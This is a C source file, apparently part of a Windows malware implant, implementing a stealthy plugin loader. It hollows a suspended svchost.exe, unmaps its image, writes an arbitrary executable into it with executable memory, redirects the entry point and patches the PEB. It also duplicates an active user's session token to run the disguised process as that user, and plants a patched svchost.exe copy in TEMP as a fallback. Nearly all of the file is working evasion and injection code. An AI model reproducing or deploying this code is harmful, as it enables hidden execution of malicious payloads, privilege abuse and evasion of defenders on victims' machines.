#include "stealth.h"


PWCHAR GetProcessCommandLine(DWORD dwPID, BOOL bWOW64)
{
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    PEB_32 peb32;
    RTL_USER_PROCESS_PARAMETERS rup;
    RTL_USER_PROCESS_PARAMETERS_32 rup32;
    func_NtQueryInformationProcess fn_NtQueryInformationProcess = NULL;
    HMODULE hModule = NULL;
    HANDLE hProcess = NULL;
    PWCHAR pwszCommandLine = NULL;
    ULONG_PTR PebBaseAddress = 0;
    ULONG ulReturn = 0;
    ULONG ulResult = 0;

    if (dwPID == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPID);
    if (hProcess == NULL)
    {
        goto cleanup;
    }

    hModule = GetModuleHandleW(L"ntdll.dll");
    if (hModule == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    fn_NtQueryInformationProcess = GetProcAddress(hModule, "NtQueryInformationProcess");
    if (fn_NtQueryInformationProcess == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (bWOW64)
    {
        ulResult = fn_NtQueryInformationProcess(hProcess, ProcessWow64Information, &PebBaseAddress, sizeof(ULONG_PTR), &ulReturn);
        if (ulResult != 0)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!ReadProcessMemory(hProcess, PebBaseAddress, &peb32, sizeof(PEB_32), NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!ReadProcessMemory(hProcess, peb32.ProcessParameters, &rup32, sizeof(RTL_USER_PROCESS_PARAMETERS_32), NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        pwszCommandLine = (PWCHAR)MemoryAllocate(NULL, rup32.CommandLine.Length + 2);
        if (pwszCommandLine == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!ReadProcessMemory(hProcess, rup32.CommandLine.Buffer, pwszCommandLine, rup32.CommandLine.Length, NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            MemoryFree(pwszCommandLine) ? pwszCommandLine = NULL : 0;
            goto cleanup;
        }
    }
    else
    {
        if (fn_NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ulReturn) != 0)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, (LPVOID)&peb, sizeof(PEB), NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!ReadProcessMemory(hProcess, peb.ProcessParameters, (LPVOID)&rup, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        pwszCommandLine = (PWCHAR)MemoryAllocate(NULL, rup.CommandLine.Length + 2);
        if (pwszCommandLine == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!ReadProcessMemory(hProcess, rup.CommandLine.Buffer, pwszCommandLine, rup.CommandLine.Length, NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            MemoryFree(pwszCommandLine) ? pwszCommandLine = NULL : 0;
            goto cleanup;
        }
    }

cleanup:
    if (hProcess != NULL) CloseHandle(hProcess);

    return pwszCommandLine;
}


DWORD GetStealthProcessPID(PWCHAR pwszHostProcess, PWCHAR pwszArgument, BOOL bWOW64)
{
    PROCESSENTRY32 pe;
    HANDLE hProcSnap = INVALID_HANDLE_VALUE;
    PWCHAR pwszCommandLine = NULL;
    DWORD dwPID = 0;

    if (pwszHostProcess == NULL || pwszArgument == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszHostProcess[0] == 0 || pwszArgument[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    SecureZeroMemory(&pe, sizeof(PROCESSENTRY32));
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32FirstW(hProcSnap, &pe))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    do
    {
        if (StrCmpIW(pe.szExeFile, pwszHostProcess) == 0)
        {
            pwszCommandLine = GetProcessCommandLine(pe.th32ProcessID, bWOW64);
            if (pwszCommandLine != NULL)
            {
                if (StrCmpIW(pwszCommandLine, pwszArgument) == 0)
                {
                    dwPID = pe.th32ProcessID;
                    MemoryFree(pwszCommandLine);
                    break;
                }

                MemoryFree(pwszCommandLine);
            }
        }

    } while (Process32NextW(hProcSnap,&pe));

cleanup:
    if (hProcSnap != INVALID_HANDLE_VALUE) CloseHandle(hProcSnap);

    return dwPID;
}


BOOL CopyAndModifyHost(LPVOID lpModule, PWCHAR pwszInputFile, PWCHAR pwszOutputFile, BOOL bWOW64)
{
    PIMAGE_DOS_HEADER peIDH = NULL;
    PIMAGE_NT_HEADERS32 peINH32 = NULL;
    PIMAGE_NT_HEADERS64 peINH64 = NULL;
    LPVOID lpImageBase = NULL;
    LPVOID lpHostFile = NULL;
    BOOL bRet = FALSE;

    if (lpModule == NULL || pwszInputFile == NULL || pwszOutputFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszInputFile[0] == 0 || pwszOutputFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    peIDH = (PIMAGE_DOS_HEADER)lpModule;

#if _WIN64
    if (!bWOW64)
    {
        peINH64 = (PIMAGE_NT_HEADERS64)((LPBYTE)lpModule + peIDH->e_lfanew);
        lpImageBase = peINH64->OptionalHeader.ImageBase;
    }
    else
    {
        peINH32 = (PIMAGE_NT_HEADERS32)((LPBYTE)lpModule + peIDH->e_lfanew);
        lpImageBase = peINH32->OptionalHeader.ImageBase;
    }
#elif _WIN32
    peINH32 = (PIMAGE_NT_HEADERS32)((LPBYTE)lpModule + peIDH->e_lfanew);
    lpImageBase = peINH32->OptionalHeader.ImageBase;
#endif

    lpHostFile = ReadFromFile(pwszInputFile, NULL);
    if (lpHostFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    peIDH = (PIMAGE_DOS_HEADER)lpHostFile;

#if _WIN64
    if (!bWOW64)
    {
        peINH64 = (PIMAGE_NT_HEADERS64)((LPBYTE)lpHostFile + peIDH->e_lfanew);
        peINH64->OptionalHeader.ImageBase = lpImageBase;

        if (!(peINH64->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
        {
            peINH64->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
        }
    }
    else
    {
        peINH32 = (PIMAGE_NT_HEADERS32)((LPBYTE)lpHostFile + peIDH->e_lfanew);
        peINH32->OptionalHeader.ImageBase = lpImageBase;

        if (!(peINH32->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
        {
            peINH32->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
        }
    }
#elif _WIN32
    peINH32 = (PIMAGE_NT_HEADERS32)((LPBYTE)lpHostFile + peIDH->e_lfanew);
    peINH32->OptionalHeader.ImageBase = lpImageBase;

    if (!(peINH32->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
    {
        peINH32->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
    }
#endif

    if (!WriteToFile(pwszOutputFile, lpHostFile, MemorySize(lpHostFile)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bRet = TRUE;

cleanup:
    if (lpHostFile != NULL) MemoryFree(lpHostFile);

    return bRet;
}


BOOL RunProcess(PWCHAR pwszHostPath, PWCHAR pwszArgument, DWORD dwCreationFlags, HANDLE hStdIn, HANDLE hStdOut, LPHANDLE lphProcess, LPHANDLE lphThread, BOOL bImpersonate)
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    SID_NAME_USE snu;
    PROFILEINFO po;
    func_CreateProcessAsUserW fn_CreateProcessAsUserW = NULL;
    HMODULE hModule = NULL;
    HANDLE hImpersonationToken = INVALID_HANDLE_VALUE;
    HANDLE hUserToken = INVALID_HANDLE_VALUE;
    PWTS_SESSION_INFO pwsi = NULL;
    PTOKEN_USER ptu = NULL;
    LPVOID lpEnvironment = NULL;
    PWCHAR pwszUsername = NULL;
    PWCHAR pwszDomain = NULL;
    DWORD dwSessionInfo = 0;
    DWORD dwSessionID = 0;
    DWORD dwSize = 0;
    DWORD dwCnt = 0;
    BOOL bRet = FALSE;

    if (pwszHostPath == NULL && pwszArgument == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    SecureZeroMemory(&si, sizeof(STARTUPINFO));

    if (IsProcessSystem(NULL) && bImpersonate && LOBYTE(LOWORD(GetVersion())) >= 6)
    {
        hModule = GetModuleHandleW(L"kernel32.dll");
        if (hModule == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        fn_CreateProcessAsUserW = GetProcAddress(hModule, "CreateProcessAsUserW");
        if (fn_CreateProcessAsUserW == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!EnablePrivilege(NULL, SE_TCB_NAME))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pwsi, &dwSessionInfo))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        for (dwCnt = 0; dwCnt < dwSessionInfo; dwCnt++)
        {
            if (pwsi[dwCnt].State == WTSActive)
            {
                dwSessionID = pwsi[dwCnt].SessionId;
                break;
            }
        }

        if (dwSessionID == 0)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!WTSQueryUserToken(dwSessionID, &hImpersonationToken))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!DuplicateTokenEx(hImpersonationToken, 0, NULL, SecurityImpersonation, TokenPrimary, &hUserToken))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!GetTokenInformation(hUserToken, TokenUser, NULL, 0, &dwSize))
        {
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                goto cleanup;
            }
        }

        ptu = MemoryAllocate(NULL, dwSize);
        if (ptu == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!GetTokenInformation(hUserToken, TokenUser, ptu, dwSize, &dwSize))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        pwszUsername = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
        if (pwszUsername == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        pwszDomain = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
        if (pwszDomain == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        SecureZeroMemory(&snu, sizeof(SID_NAME_USE));
        dwSize = MAX_PATH;

        if (!LookupAccountSidW(NULL , ptu->User.Sid, pwszUsername, &dwSize, pwszDomain, &dwSize, &snu))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        SecureZeroMemory(&po, sizeof(PROFILEINFO));
        po.dwSize = sizeof(PROFILEINFO);
        po.lpUserName = pwszUsername;

        if (!LoadUserProfileW(hUserToken, &po))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!CreateEnvironmentBlock(&lpEnvironment, hUserToken, FALSE))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        si.cb = sizeof(STARTUPINFO);
        si.hStdInput = hStdIn;
        si.hStdOutput = hStdOut;
        si.hStdError = hStdOut;
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.lpDesktop = L"winsta0\\default";

        if (!fn_CreateProcessAsUserW(hUserToken, pwszHostPath, pwszArgument, NULL, NULL, FALSE, dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT, lpEnvironment, NULL, &si, &pi))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }
    else
    {
        si.cb = sizeof(STARTUPINFO);
        si.hStdInput = hStdIn;
        si.hStdOutput = hStdOut;
        si.hStdError = hStdOut;
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;

        if (!CreateProcessW(pwszHostPath, pwszArgument, NULL, NULL, TRUE, dwCreationFlags, NULL, NULL, &si, &pi))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

    if (lphProcess != NULL)
    {
        *lphProcess = pi.hProcess;
    }

    if (lphThread != NULL)
    {
        *lphThread = pi.hThread;
    }

    bRet = TRUE;

cleanup:
    if (ptu != NULL) MemoryFree(ptu);
    if (pwszUsername != NULL) MemoryFree(pwszUsername);
    if (pwszDomain != NULL) MemoryFree(pwszDomain);
    if (pwsi != NULL) WTSFreeMemory(pwsi);
    if (po.hProfile != INVALID_HANDLE_VALUE) UnloadUserProfile(hUserToken, po.hProfile);
    if (hUserToken != INVALID_HANDLE_VALUE) CloseHandle(hUserToken);
    if (hImpersonationToken != INVALID_HANDLE_VALUE) CloseHandle(hImpersonationToken);
    if (lpEnvironment != NULL) DestroyEnvironmentBlock(lpEnvironment);

    return bRet;
}


DWORD LaunchStealthProcess(PWCHAR pwszHostPath, PWCHAR pwszArgument, HANDLE hStdIn, HANDLE hStdOut, LPVOID lpFile, DWORD dwFile, BOOL bImpersonate)
{
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    CONTEXT ctx;
    func_NtQueryInformationProcess fn_NtQueryInformationProcess = NULL;
    func_NtUnmapViewOfSection fn_NtUnmapViewOfSection = NULL;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    HANDLE hThread = INVALID_HANDLE_VALUE;
    PIMAGE_DOS_HEADER peIDH = NULL;
    PIMAGE_NT_HEADERS peINH = NULL;
    PIMAGE_SECTION_HEADER peISH = NULL;
    HMODULE hModule = NULL;
    LPVOID lpImageBase = NULL;
    ULONG ulReturn = 0;
    ULONG ulResult = 0;
    DWORD dwRet = 0;
    DWORD dwCnt =0;

    if ((pwszHostPath == NULL && pwszArgument == NULL) || lpFile == NULL || dwFile == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!RunProcess(pwszHostPath, pwszArgument, CREATE_SUSPENDED, hStdIn, hStdOut, &hProcess, &hThread, bImpersonate))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hModule = GetModuleHandleW(L"ntdll.dll");
    if (hModule == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    fn_NtQueryInformationProcess = GetProcAddress(hModule, "NtQueryInformationProcess");
    if (fn_NtQueryInformationProcess == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    ulResult = fn_NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ulReturn);
    if (ulResult != 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, (LPVOID)&peb, sizeof(PEB), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    peIDH = (PIMAGE_DOS_HEADER)lpFile;
    peINH = (PIMAGE_NT_HEADERS)((LPBYTE)lpFile + peIDH->e_lfanew);
    peISH = (PIMAGE_SECTION_HEADER)(peINH + 1);

    if (peb.Reserved3[1] == peINH->OptionalHeader.ImageBase)
    {
        fn_NtUnmapViewOfSection = GetProcAddress(hModule, "NtUnmapViewOfSection");
        if (fn_NtUnmapViewOfSection == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        ulResult = fn_NtUnmapViewOfSection(hProcess, peINH->OptionalHeader.ImageBase);
        if (ulResult != 0)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

    lpImageBase = VirtualAllocEx(hProcess, peINH->OptionalHeader.ImageBase, peINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpImageBase == NULL)
    {
        if (GetLastError() == ERROR_INVALID_ADDRESS)
        {
            dwRet = 1;
            goto cleanup;
        }

        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!WriteProcessMemory(hProcess, lpImageBase, (LPVOID)lpFile, peINH->OptionalHeader.SizeOfHeaders, NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    for (dwCnt = 0; dwCnt < peINH->FileHeader.NumberOfSections; dwCnt++)
    {
        if (peISH[dwCnt].SizeOfRawData == 0)
        {
            continue;
        }

        if (!WriteProcessMemory(hProcess, (PVOID)((LPBYTE)lpImageBase + peISH[dwCnt].VirtualAddress), (PVOID)((LPBYTE)lpFile + peISH[dwCnt].PointerToRawData), peISH[dwCnt].SizeOfRawData, NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

    SecureZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN64
    ctx.Rcx = lpImageBase + peINH->OptionalHeader.AddressOfEntryPoint;
#elif _WIN32
    ctx.Eax = lpImageBase + peINH->OptionalHeader.AddressOfEntryPoint;
#endif

    if (!SetThreadContext(hThread, &ctx))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    peb.Reserved3[1] = lpImageBase;

    if (!WriteProcessMemory(hProcess, pbi.PebBaseAddress, (LPVOID)&peb, sizeof(PEB), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    dwRet = 2;

cleanup:
    dwRet == 2 ? ResumeThread(hThread) : TerminateProcess(hProcess, 0);
    if (hThread != INVALID_HANDLE_VALUE) CloseHandle(hThread);
    if (hProcess != INVALID_HANDLE_VALUE) CloseHandle(hProcess);

    return dwRet;
}


BOOL LaunchPlugin(PWCHAR pwszPluginName, LPVOID lpFile, DWORD dwFile)
{
    HRESULT hr = S_OK;
    PWTS_SESSION_INFO pwsi = NULL;
    PWCHAR pwszSystemPath = NULL;
    PWCHAR pwszTempPath = NULL;
    PWCHAR pwszHostPath = NULL;
    PWCHAR pwszReservePath = NULL;
    DWORD dwSessionInfo = 0;
    DWORD dwSessionID = 0;
    DWORD dwCnt = 0;
    DWORD dwRet = 0;
    BOOL bImpersonate = FALSE;
    BOOL bRet = FALSE;

    if (pwszPluginName == NULL || lpFile == NULL || dwFile == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszSystemPath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszSystemPath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"SystemRoot", pwszSystemPath, (MemorySize(pwszSystemPath) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszHostPath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszHostPath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszHostPath, MemorySize(pwszHostPath), L"%s\\system32\\svchost.exe", pwszSystemPath);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (IsProcessSystem(NULL))
    {
        if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pwsi, &dwSessionInfo))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        for (dwCnt = 0; dwCnt < dwSessionInfo; dwCnt++)
        {
            if (pwsi[dwCnt].State == WTSActive)
            {
                dwSessionID = pwsi[dwCnt].SessionId;
                break;
            }
        }

        if (dwSessionID != 0)
        {
            bImpersonate = TRUE;
        }
    }

    dwRet = LaunchStealthProcess(pwszHostPath, pwszPluginName, NULL, NULL, lpFile, dwFile, bImpersonate);
    if (dwRet == 1)
    {
        pwszTempPath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
        if (pwszTempPath == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!GetEnvironmentVariableW(L"TEMP", pwszTempPath, (MemorySize(pwszTempPath) - 2) / sizeof(WCHAR)))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        pwszReservePath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
        if (pwszReservePath == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        hr = StringCbPrintfW(pwszReservePath, MemorySize(pwszReservePath), L"%s\\svchost.exe", pwszTempPath);
        if (FAILED(hr))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!CopyAndModifyHost(lpFile, pwszHostPath, pwszReservePath, FALSE))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        dwRet = LaunchStealthProcess(pwszReservePath, pwszPluginName, NULL, NULL, lpFile, dwFile, bImpersonate);
        if (dwRet != 2)
        {
            if (!EraseFile(pwszReservePath))
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                goto cleanup;
            }

            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }
    else if (dwRet == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bRet = TRUE;

cleanup:
    if (pwszSystemPath != NULL) MemoryFree(pwszSystemPath);
    if (pwszTempPath != NULL) MemoryFree(pwszTempPath);
    if (pwszHostPath != NULL) MemoryFree(pwszHostPath);
    if (pwszReservePath != NULL) MemoryFree(pwszReservePath);
    if (pwsi != NULL) WTSFreeMemory(pwsi);

    return bRet;
}